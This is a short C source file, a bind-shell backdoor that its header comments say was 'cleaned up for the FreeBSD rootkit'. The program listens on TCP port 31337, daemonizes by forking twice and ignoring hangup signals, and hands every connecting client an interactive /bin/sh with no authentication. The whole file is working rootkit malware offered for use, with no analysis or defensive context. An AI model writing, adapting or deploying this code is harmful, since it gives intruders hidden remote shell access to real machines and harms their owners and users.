/* quick thingy... bind a shell to a socket... defaults to port 31337 */
/* code by pluvius@****** (address removed to protect the innocent :) */
/* don't forget.. when you connect to the port.. commands are like:   */
/* "ls -l;" or "exit;" (don't forget the ';')                         */

/* cleaned up for the FreeBSD rootkit */

#include <stdio.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include "rootkitutil.h"

#define PORT	31337

main() 
{
	int soc_des,soc_cli,soc_rc,soc_len,server_pid,cli_pid;
	struct sockaddr_in serv_addr,client_addr;

	if((soc_des=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP))<0)
		ERR("socket")

	memset(&serv_addr,0x00,sizeof(serv_addr));
	serv_addr.sin_family=AF_INET; 
	serv_addr.sin_addr.s_addr=htonl(INADDR_ANY);
	serv_addr.sin_port=htons(PORT);

	if((soc_rc=bind(soc_des,(struct sockaddr *)&serv_addr,sizeof(serv_addr))!=0)
		ERR("bind")

	if(fork()!=0) 
		exit(0);

	setpgrp();  
	signal(SIGHUP, SIG_IGN); 

	if(fork()!=0) 
		exit(0); 

	if((soc_rc=listen(soc_des, 5))!=0)
		ERR("listen")

	for(;;) {
		soc_len=sizeof(client_addr);
		if((soc_cli=accept(soc_des, (struct sockaddr *)&client_addr, &soc_len))<0)
			ERR("accept")

		cli_pid=getpid(); 
		server_pid=fork(); 

		if(server_pid!=0) {
			dup2(soc_cli,0); 
			dup2(soc_cli,1); 
			dup2(soc_cli,2);
			execl("/bin/sh","sh","-i",0); 
			close(soc_cli); 
			exit(0); 
		} 

		close(soc_cli);
	}
}
